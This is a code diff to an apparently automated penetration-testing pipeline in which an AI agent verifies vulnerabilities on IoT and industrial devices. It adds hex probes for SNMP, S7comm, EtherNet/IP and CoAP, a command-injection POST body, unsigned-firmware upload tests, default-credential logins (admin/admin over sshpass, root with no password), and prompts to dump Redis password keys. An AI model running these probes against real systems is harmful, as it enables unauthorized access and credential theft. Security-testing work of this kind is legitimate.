@@ -112,6 +112,15 @@ SEALED_FORBIDDEN_TOOLS = {"python_exec", "search_history"}
 COMPACT_INTRUSION_COMPLETION_TOOL = "complete_intrusion_campaign"
 COMPACT_INTRUSION_FALLBACK_MAX_ACTIONS = 64
 COMPACT_INTRUSION_FALLBACK_MAX_ROUNDS = 4
+COMPACT_PHASE4_DEFAULT_MAX_WORKERS = 2
+
+# Fixed, read-only protocol probes used by the compact Phase 4 contract.
+_SNMP_V1_GET_SYS_DESCR_HEX = (
+    "302602010004067075626c6963a019020101020100020100300e"
+    "300c06082b060102010101000500"
+)
+_S7COMM_COTP_CR_HEX = "0300001611e00000000100c1020100c2020102c0010a"
+_ENIP_LIST_IDENTITY_HEX = "630000000000000000000000000000000000000000000000"
 
 PHASE4_LOCAL_COMMON_TOOL_NAMES = frozenset({
     "decode_value", "list_skills", "load_skill", "search_knowledge",
@@ -125,7 +134,7 @@ PHASE4_LOCAL_CATEGORY_TOOL_NAMES = {
     "data_access": frozenset({
         "http_get", "http_request", "curl_headers", "mqtt_listen",
         "mysql_query", "redis_cmd", "ftp_list", "telnet_connect",
-        "nmap_scan", "udp_send",
+        "nmap_scan", "tcp_send", "udp_send",
     }),
     "injection": frozenset({
         "http_get", "http_request", "curl_headers",
@@ -144,8 +153,11 @@ PHASE4_LOCAL_SERVICE_TOOL_NAMES = {
     "mariadb": frozenset({"mysql_query", "nmap_scan"}),
     "redis": frozenset({"redis_cmd", "nmap_scan"}),
     "ftp": frozenset({"ftp_list", "try_credential", "nmap_scan"}),
-    "snmp": frozenset({"nmap_scan"}),
+    "snmp": frozenset({"nmap_scan", "udp_send"}),
     "coap": frozenset({"nmap_scan", "udp_send"}),
+    "s7comm": frozenset({"tcp_send", "nmap_scan"}),
+    "enip": frozenset({"tcp_send", "nmap_scan"}),
+    "ethernet/ip": frozenset({"tcp_send", "nmap_scan"}),
     "modbus": frozenset({"modbus_scan", "nmap_scan"}),
     "opcua": frozenset({"tcp_send", "nmap_scan"}),
     "bacnet": frozenset({"udp_send", "nmap_scan"}),
@@ -227,9 +239,42 @@ def _phase4_verification_plan(
     if vuln_type == "missing_header":
         return {"tool": "curl_headers", "target": ip, "port": port or 80,
                 "args_hint": {"url": url}, "success_condition": "headers captured"}
+    if vuln_type == "insecure_update" and service in {"http", "https"}:
+        return {
+            "tool": "http_request", "target": ip, "port": port or 80,
+            "endpoint": endpoint,
+            "args_hint": {
+                "url": url, "method": "POST",
+                "headers": {"Content-Type": "application/json"},
+                "body": '{"version":"phase4-probe","firmware":"LANCE_PHASE4_PROBE","signature":""}',
+                "follow_redirects": False, "verify_tls": False,
+            },
+            "require_body": True,
+            "success_condition": "unsigned firmware upload accepted without an integrity check",
+        }
+    if vuln_type == "code_injection" and service in {"http", "https"}:
+        return {
+            "tool": "http_request", "target": ip, "port": port or 80,
+            "endpoint": endpoint,
+            "args_hint": {
+                "url": url, "method": "POST",
+                "headers": {"Content-Type": "application/json"},
+                "body": '{"cmd":"id","command":"id"}',
+                "follow_redirects": False, "verify_tls": False,
+            },
+            "require_body": True,
+            "success_condition": "HTTP response contains command execution proof",
+        }
     if vuln_type in {"directory_listing", "data_exposure", "code_injection", "no_auth", "broken_access_control"} and service in {"http", "https"}:
         return {"tool": "http_get", "target": ip, "port": port or 80, "endpoint": endpoint,
                 "args_hint": {"url": url}, "success_condition": "affected HTTP endpoint fetched"}
+    if vuln_type == "data_exposure" and (service == "ftp" or port == 21):
+        ftp_suffix = endpoint if endpoint.startswith("/") else (f"/{endpoint}" if endpoint else "/")
+        return {
+            "tool": "ftp_list", "target": ip, "port": port or 21,
+            "args_hint": {"url": f"ftp://{ip}:{port or 21}{ftp_suffix}"},
+            "success_condition": "anonymous FTP listing exposes sensitive entries",
+        }
     if vuln_type in {"info_disclosure", "version_leak"}:
         if service in {"ssh", "telnet"} or port == 22:
             return {"tool": "ssh_audit", "target": ip, "port": port or 22,
@@ -269,26 +314,53 @@ def _phase4_verification_plan(
             return {"tool": "modbus_scan", "target": ip, "port": 502,
                     "args_hint": {"target": ip}, "success_condition": "Modbus registers or service response captured"}
         if compact and port in {102, 44818}:
-            script = "s7-info" if port == 102 else "enip-info"
-            return {"tool": "nmap_scan", "target": ip, "port": port,
-                    "required_port": port, "required_scripts": script,
-                    "args_hint": {"target": ip, "ports": str(port),
-                                  "scripts": script, "skip_discovery": True},
-                    "success_condition": "Protocol response or authentication-disabled marker"}
+            payload = _S7COMM_COTP_CR_HEX if port == 102 else _ENIP_LIST_IDENTITY_HEX
+            return {
+                "tool": "tcp_send", "target": ip, "port": port,
+                "required_payload": payload,
+                "args_hint": {
+                    "host": ip, "port": port, "payload_hex": payload,
+                    "recv_bytes": 4096, "timeout": 5,
+                },
+                "success_condition": "unauthenticated protocol negotiation or identity response",
+            }
         if service in {"http", "https"}:
             return {"tool": "http_get", "target": ip, "port": port or 80, "endpoint": endpoint,
                     "args_hint": {"url": url}, "success_condition": "unauthenticated endpoint fetched"}
     if vuln_type in {"default_credentials", "privilege_escalation"}:
+        if service == "snmp" or port == 161:
+            return {
+                "tool": "udp_send", "target": ip, "port": 161,
+                "required_payload": _SNMP_V1_GET_SYS_DESCR_HEX,
+                "args_hint": {
+                    "host": ip, "port": 161,
+                    "payload": _SNMP_V1_GET_SYS_DESCR_HEX,
+                    "encoding": "hex", "recv_bytes": 4096, "timeout": 5,
+                },
+                "success_condition": "SNMP response to the public community read probe",
+            }
         if service == "ssh" or port == 22:
             return {"tool": "ssh_login", "target": ip, "port": 22,
                     "args_hint": {"command_string": f"sshpass -p admin ssh -o StrictHostKeyChecking=no admin@{ip} 'id'"}, "success_condition": "login or authentication result captured"}
         if service in {"mysql", "mariadb"} or port == 3306:
             return {"tool": "mysql_query", "target": ip, "port": port or 3306,
                     "args_hint": {"host": ip, "user": "root",
-                                  "query": "SELECT USER(), CURRENT_USER();"},
+                                  "query": "SELECT USER(), CURRENT_USER();",
+                                  "skip_ssl": True},
                     "success_condition": "query succeeds without a password"}
         return {"tool": "try_credential", "target": ip, "port": port, "service": service or "http",
                 "args_hint": {"ip": ip, "service": service or "http", "user": "admin", "password": "admin", "port": port}, "success_condition": "credential attempt result captured"}
+    if compact and vuln_type == "no_auth" and (service == "coap" or port == 5683):
+        return {
+            "tool": "udp_send", "target": ip, "port": 5683,
+            "required_payload": "44011234deadbeefbb2e77656c6c2d6b6e6f776e04636f7265",
+            "args_hint": {
+                "host": ip, "port": 5683,
+                "payload": "44011234deadbeefbb2e77656c6c2d6b6e6f776e04636f7265",
+                "encoding": "hex", "recv_bytes": 4096, "timeout": 5,
+            },
+            "success_condition": "CoAP response received over unauthenticated UDP",
+        }
     if service == "mqtt":
         return {"tool": "mqtt_listen", "target": ip, "port": port or 1883,
                 "args_hint": {"broker": ip, "topic": "#", "count": 5, "timeout": 5}, "success_condition": "MQTT service response captured"}
@@ -304,7 +376,7 @@ def _phase4_requirement_matches(requirement: dict, tool: str, args: dict) -> boo
     if tool != requirement.get("tool"):
         return False
     target = str(requirement.get("target") or "")
-    if tool in {"ssh_audit", "nmap_scan", "modbus_scan", "mysql_query"} and str(args.get("host") or args.get("target") or "") != target:
+    if tool in {"ssh_audit", "nmap_scan", "modbus_scan", "mysql_query", "tcp_send", "udp_send"} and str(args.get("host") or args.get("target") or "") != target:
         return False
     if tool == "nmap_scan":
         required_port = requirement.get("required_port")
@@ -315,6 +387,19 @@ def _phase4_requirement_matches(requirement: dict, tool: str, args: dict) -> boo
         required_scripts = str(requirement.get("required_scripts") or "").strip()
         if required_scripts and required_scripts not in str(args.get("scripts") or ""):
             return False
+    if tool in {"tcp_send", "udp_send"}:
+        expected_port = requirement.get("port")
+        if expected_port not in (None, ""):
+            try:
+                if int(args.get("port")) != int(expected_port):
+                    return False
+            except (TypeError, ValueError):
+                return False
+        expected_payload = str(requirement.get("required_payload") or "").casefold()
+        if expected_payload:
+            payload_key = "payload_hex" if tool == "tcp_send" else "payload"
+            if str(args.get(payload_key) or "").replace(" ", "").casefold() != expected_payload.replace(" ", ""):
+                return False
     if tool == "mqtt_listen" and str(args.get("broker") or "") != target:
         return False
     if tool == "try_credential":
@@ -332,8 +417,11 @@ def _phase4_requirement_matches(requirement: dict, tool: str, args: dict) -> boo
             except (TypeError, ValueError):
                 return False
     if tool == "mysql_query":
-        expected_user = str((requirement.get("args_hint") or {}).get("user") or "").strip()
+        hint = requirement.get("args_hint") or {}
+        expected_user = str(hint.get("user") or "").strip()
         if expected_user and str(args.get("user") or "").strip() != expected_user:
+            return False
+        if hint.get("skip_ssl") and not bool(args.get("skip_ssl")):
             return False
     if tool in {"http_get", "curl_headers", "http_request"}:
         raw_url = str(args.get("url") or "")
@@ -345,24 +433,27 @@ def _phase4_requirement_matches(requirement: dict, tool: str, args: dict) -> boo
         endpoint = str(requirement.get("endpoint") or "")
         if endpoint and endpoint not in raw_url:
             return False
-        # Compact MQTT-WebSocket verification needs a real upgrade request;
-        # accepting the URL alone lets a plain GET satisfy the required probe
-        # while producing no useful Phase 4 evidence.
-        if tool == "http_request" and requirement.get("port") == 9001:
+        if tool == "http_request":
             hint = requirement.get("args_hint") or {}
             expected_method = str(hint.get("method") or "").upper()
             if expected_method and str(args.get("method") or "").upper() != expected_method:
                 return False
-            expected_headers = {
-                str(key).casefold(): str(value)
-                for key, value in (hint.get("headers") or {}).items()
-            }
-            supplied_headers = {
-                str(key).casefold(): str(value)
-                for key, value in (args.get("headers") or {}).items()
-            }
-            if any(supplied_headers.get(key) != value for key, value in expected_headers.items()):
+            if requirement.get("require_body") and not str(args.get("body") or "").strip():
                 return False
+            # Compact MQTT-WebSocket verification needs a real upgrade request;
+            # accepting the URL alone lets a plain GET satisfy the required probe
+            # while producing no useful Phase 4 evidence.
+            if requirement.get("port") == 9001:
+                expected_headers = {
+                    str(key).casefold(): str(value)
+                    for key, value in (hint.get("headers") or {}).items()
+                }
+                supplied_headers = {
+                    str(key).casefold(): str(value)
+                    for key, value in (args.get("headers") or {}).items()
+                }
+                if any(supplied_headers.get(key) != value for key, value in expected_headers.items()):
+                    return False
     if tool == "telnet_connect" and target not in str(args.get("command_string") or ""):
         return False
     if tool == "ftp_list" and target not in str(args.get("url") or ""):
@@ -431,8 +522,8 @@ EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
         ),
         "mysql": (
             "Test default credentials on this service.\n"
-            "For MySQL/MariaDB (port 3306) — try root with empty password:\n"
-            "  mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\")\n"
+            "For MySQL/MariaDB (port 3306) — try root with empty password and skip only certificate validation:\n"
+            "  mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES; SELECT * FROM information_schema.tables LIMIT 5;\", skip_ssl=true)\n"
             "Report ALL data retrieved in data_extracted field.\n"
         ),
         "mqtt": (
@@ -444,8 +535,8 @@ EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
         ),
         "snmp": (
             "Test default credentials on this service.\n"
-            "For SNMP (port 161) — test default community strings:\n"
-            "  nmap_scan(target=\"{ip}\", ports=\"161\", scripts=\"snmp-brute\", skip_discovery=True, udp_scan=True)\n"
+            "For SNMP (port 161) — run the required read-only public-community probe:\n"
+            "  udp_send(host=\"{ip}\", port=161, payload=\"302402010004067075626c6963a017020101020100300c300a06082b060102010101010500\", encoding=\"hex\", timeout=5)\n"
         ),
         "redis": (
             "Test default credentials on this service.\n"
@@ -459,18 +550,18 @@ EXPLOIT_INSTRUCTIONS: dict[str, dict[str, str]] = {
         "mqtt": "For MQTT no_auth (port 1883): mqtt_listen(broker=\"{ip}\", topic=\"#\", count=10, timeout=8) — capture messages, extract credentials/keys\n",
         "http": "For HTTP data_exposure: http_get(URL) using URLs from Phase 3 evidence. If evidence mentions /backup/file.sql, use http_get(\"http://{ip}/backup/file.sql\")\nFor HTTP directory_listing: http_get(base_url) first to confirm, then http_get(listed_file_url) for each listed file\nIf the URL from evidence returns 404, mark the Phase 4 attempt as FAILED and preserve the 404 as evidence.",
         "telnet": "For Telnet (port 23): telnet_connect(\"echo quit | timeout 3 nc {ip} 23\") — show session\n",
-        "mysql": "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\") — show data\n",
+        "mysql": "For MySQL/MariaDB (port 3306): mysql_query(host=\"{ip}\", user=\"root\", query=\"SHOW DATABASES;\", skip_ssl=true) — show data\n",
         "ftp": "For FTP (port 21): ftp_list(\"ftp://{ip}/\") then ftp_list(\"ftp://{ip}/config/\") — show files\n",
         "redis": "For Redis (port 6379): redis_cmd(host=\"{ip}\", command=\"KEYS *\") then redis_cmd(host=\"{ip}\", command=\"GET config:db_password\") — dump sensitive keys\n",
         "nodered": "For Node-RED (port 1880): http_get(\"http://{ip}:1880/admin\") then http_get(\"http://{ip}:1880/flows\") — confirm unauthenticated access\n",
-        "coap": "For CoAP (port 5683): nmap_scan(target=\"{ip}\", ports=\"5683\", skip_discovery=True, udp_scan=True) — confirm port open\n",
+        "coap": "For CoAP (port 5683): use the required bounded udp_send GET probe with encoding=hex and timeout=5; a response proves unauthenticated UDP access.\n",
         "default": "Access the service and retrieve actual data to prove impact. Use the tool that matches the service in evidence. If the tested URL returns 404, mark the Phase 4 attempt as FAILED and preserve the 404 as evidence."
     },
     "injection": {
         "http": (
             "Attempt code execution or unauthorized upload/firmware access.\n"
             "For file upload (web_upload role, port 80): http_get(\"http://{ip}/uploads/\") to check for uploaded files, then http_get(\"http://{ip}/\") to confirm upload endpoint exists\n"
-            "For firmware update without signature (iot_gateway, port 80): http_get(\"http://{ip}/firmware/\") to list firmware files, then http_get(\"http://{ip}/update\") to test update endpoint\n"
+            "For firmware update without signature (iot_gateway, port 80): use the required http_request POST with a non-empty probe body; a GET or directory listing is not update acceptance.\n"
             "For web API RCE (web_server_v2, port 80): http_get(\"http://{ip}/api/exec\") then check if POST returns uid=0\n"
             "Report what is accessible and whether code execution is possible."
         ),
@@ -709,6 +800,16 @@ def _http_status(stdout: str) -> int | None:
 def _text_has_sensitive_data(text: str) -> bool:
     return bool(re.search(
         r"(password|passwd|pass|secret|api[_-]?key|token|credential|db_user|db_pass|private[_ -]?key)",
+        text or "",
+        re.IGNORECASE,
+    ))
+
+
+def _ftp_listing_has_sensitive_entries(text: str) -> bool:
+    """Recognize sensitive FTP entries without treating firmware as secrets."""
+    return bool(re.search(
+        r"(password|passwd|secret|api[_-]?key|token|credential|\.env|\.sql|"
+        r"database|config(?:uration)?|backup|private[_ -]?key|id_rsa)",
         text or "",
         re.IGNORECASE,
     ))
@@ -968,16 +1069,33 @@ def _synthesize_exploit_result(vuln: dict, tool_records: list[dict], memo: str =
                     confirmations.append({"tool": tool, "level": 1, "evidence": f"{tool} captured the HTTP response headers for comparison:\n{text[:800]}"})
                 continue
             if compact and vuln_type == "code_injection" and http_ok:
-                failures.append(f"{tool} confirmed endpoint reachability but not the claimed injection impact")
+                method = str(args.get("method") or "").upper()
+                body = str(args.get("body") or "").strip()
+                command_markers = re.search(
+                    r"(?:\buid=\d+\b|\"uid\"\s*:|command\s+(?:output|result))",
+                    lower,
+                )
+                if tool == "http_request" and method in {"POST", "PUT", "PATCH"} and body and command_markers:
+                    confirmations.append({"tool": tool, "level": 3, "evidence": f"{tool} returned command-execution evidence:\n{text[:800]}"})
+                else:
+                    failures.append(f"{tool} confirmed endpoint reachability but not the claimed injection impact")
                 continue
             if compact and vuln_type == "insecure_update" and http_ok:
+                method = str(args.get("method") or "").upper()
+                body = str(args.get("body") or "").strip()
                 update_markers = (
-                    "update accepted", "firmware", "ota", "signature", "upgrade",
+                    "update accepted", "upload accepted", "firmware accepted",
+                    "signature not required", "update complete", "updated successfully",
                 )
-                if any(marker in lower for marker in update_markers):
-                    confirmations.append({"tool": tool, "level": 2, "evidence": f"{tool} returned an update/firmware acceptance marker:\n{text[:800]}"})
+                if (
+                    tool == "http_request"
+                    and method in {"POST", "PUT", "PATCH"}
+                    and body
+                    and any(marker in lower for marker in update_markers)
+                ):
+                    confirmations.append({"tool": tool, "level": 2, "evidence": f"{tool} accepted a non-empty firmware update request without signature proof:\n{text[:800]}"})
                 else:
-                    failures.append(f"{tool} confirmed endpoint reachability but not update acceptance")
+                    failures.append(f"{tool} did not prove an accepted firmware upload without integrity validation")
                 continue
             if vuln_type == "no_auth" and http_ok:
                 login_challenge = any(marker in lower for marker in (
@@ -1066,7 +1184,10 @@ def _synthesize_exploit_result(vuln: dict, tool_records: list[dict], memo: str =
                 if rc in (0, 3) and any(cve and cve in lower for cve in claimed_cves):
                     confirmations.append({"tool": tool, "level": 2, "evidence": f"ssh_audit captured the claimed CVE identifier:\n{text[:800]}"})
                 else:
-                    failures.append("ssh_audit did not provide CVE-specific evidence")
+                    # A generic SSH weakness does not refute the claimed CVE.
+                    # Keep this inconclusive so the evaluator preserves the
+                    # Phase 3 observation instead of counting a false negative.
+                    errors.append("ssh_audit did not provide CVE-specific evidence")
                 continue
             if rc in (0, 3) and any(marker in lower for marker in ("[fail]", "[warn]", "cve-", "terrapin")):
                 confirmations.append({"tool": tool, "level": 2, "evidence": f"ssh_audit reported weak SSH configuration:\n{text[:800]}"})
@@ -1077,15 +1198,35 @@ def _synthesize_exploit_result(vuln: dict, tool_records: list[dict], memo: str =
         if tool in {"tcp_send", "udp_send"}:
             received_bytes = result.get("received_bytes")
             received_hex = str(result.get("received_hex", ""))
-            if (
+            has_response = (
                 isinstance(received_bytes, int)
                 and not isinstance(received_bytes, bool)
                 and received_bytes > 0
                 and (received.strip() or received_hex.strip())
-            ):
+            )
+            if vuln_type == "default_credentials" and (service == "snmp" or expected_port == 161):
+                if has_response:
+                    confirmations.append({"tool": tool, "level": 2, "evidence": f"{tool} received an SNMP response to the public community read probe:\n{text[:800] or received_hex[:800]}"})
+                else:
+                    failures.append("SNMP did not respond to the public community read probe")
+                continue
+            if vuln_type == "no_auth" and expected_port in {5683, 102, 44818}:
+                if has_response:
+                    confirmations.append({"tool": tool, "level": 2, "evidence": f"{tool} received an unauthenticated protocol response from port {expected_port}:\n{text[:800] or received_hex[:800]}"})
+                else:
+                    failures.append(f"{tool} did not receive a protocol response on port {expected_port}")
+                continue
+            if has_response:
                 confirmations.append({"tool": tool, "level": 2, "evidence": f"{tool} received protocol data from the target:\n{text[:800] or received_hex[:800]}"})
             else:
                 failures.append(f"{tool} did not receive a useful target response")
+            continue
+
+        if tool == "ftp_list" and vuln_type == "data_exposure":
+            if rc == 0 and text and _ftp_listing_has_sensitive_entries(text):
+                confirmations.append({"tool": tool, "level": 3, "evidence": f"ftp_list exposed sensitive FTP entries anonymously:\n{text[:800]}"})
+            else:
+                failures.append("ftp_list did not expose a sensitive anonymous FTP entry")
             continue
 
         if tool in {"mysql_query", "redis_cmd", "ftp_list"} and rc == 0 and text:
@@ -4965,6 +5106,7 @@ class Pipeline:
                 }
                 self.tracker.start_phase(phase_name)
                 result_text = ""
+                provider_error = ""
                 try:
                     compact_local_moe = self._uses_compact_local_moe()
                     if compact_local_moe or self.execution_profile.routed_tools:
@@ -4989,33 +5131,43 @@ class Pipeline:
                         verification_tools = _phase4_apply_verification_contract(
                             verification_tools, requirement
                         )
-                        result_text = self.provider.chat_with_tools(
-                            system_prompt=load_prompt(
-                                "exploit_device_vuln_memo",
-                                {
-                                    **variables,
-                                    "device": device_id,
-                                    "vulnerability": vuln_type,
-                                    "exploit_instructions": instructions,
-                                },
-                            ),
-                            user_message=(
-                                f"Verify {vuln_type} on {device_id} ({device_ip}). "
-                                f"Service: {service} port {port}. Use tools if needed, then summarize."
-                            ),
-                            tools=verification_tools,
-                            max_turns=self.execution_profile.phase4_local_max_turns,
-                            max_tokens=self.execution_profile.phase4_local_max_tokens,
-                            cost_tracker=self.tracker,
-                            stream_callback=self._model_stream_callback(
-                                stream_callback, phase=4, agent=phase_name
-                            ),
-                            required_tool=required_probe_tool or None,
-                            strict_required_tool=bool(required_probe_tool),
-                            repeat_guard=True,
-                            terminate_on_unavailable_tools={"save_deliverable"},
-                            stop_event=stop_event,
-                        )
+                        try:
+                            result_text = self.provider.chat_with_tools(
+                                system_prompt=load_prompt(
+                                    "exploit_device_vuln_memo",
+                                    {
+                                        **variables,
+                                        "device": device_id,
+                                        "vulnerability": vuln_type,
+                                        "exploit_instructions": instructions,
+                                    },
+                                ),
+                                user_message=(
+                                    f"Verify {vuln_type} on {device_id} ({device_ip}). "
+                                    f"Service: {service} port {port}. Use tools if needed, then summarize."
+                                ),
+                                tools=verification_tools,
+                                max_turns=self.execution_profile.phase4_local_max_turns,
+                                max_tokens=self.execution_profile.phase4_local_max_tokens,
+                                cost_tracker=self.tracker,
+                                stream_callback=self._model_stream_callback(
+                                    stream_callback, phase=4, agent=phase_name
+                                ),
+                                required_tool=required_probe_tool or None,
+                                strict_required_tool=bool(required_probe_tool),
+                                force_tool_on_stall=True,
+                                recover_required_tool_on_stall=True,
+                                repeat_guard=True,
+                                terminate_on_unavailable_tools={"save_deliverable"},
+                                stop_event=stop_event,
+                            )
+                        except Exception as exc:
+                            provider_error = f"{type(exc).__name__}: {exc}"
+                            result_text = ""
+                            log.warning(
+                                "Compact Phase 4 provider call failed for %s; running fallback probe: %s",
+                                vuln_id, provider_error,
+                            )
                         if _stop_requested():
                             return
                         records = _tool_records_for_vuln(self.run_dir, vuln_id)
@@ -5064,6 +5216,11 @@ class Pipeline:
                                 "evidence_level": 0,
                                 "tool_used": required_probe_tool,
                             })
+                        if provider_error:
+                            result["evidence"] = (
+                                f"Provider Phase 4 error ({provider_error}); "
+                                f"{result.get('evidence', '')}"
+                            ).strip()
                         deliverable_path.parent.mkdir(parents=True, exist_ok=True)
                         deliverable_path.write_text(
                             json.dumps(result, indent=2, ensure_ascii=False),
@@ -5175,7 +5332,12 @@ class Pipeline:
                     _time.sleep(delay)
             _run_single_exploit(task)
 
-        pool = ThreadPoolExecutor(max_workers=max(1, min(len(exploit_tasks), 8)))
+        max_workers = (
+            COMPACT_PHASE4_DEFAULT_MAX_WORKERS
+            if self._uses_compact_local_moe()
+            else 8
+        )
+        pool = ThreadPoolExecutor(max_workers=max(1, min(len(exploit_tasks), max_workers)))
         futures = [
             pool.submit(_run_with_stagger, item)
             for item in enumerate(exploit_tasks)
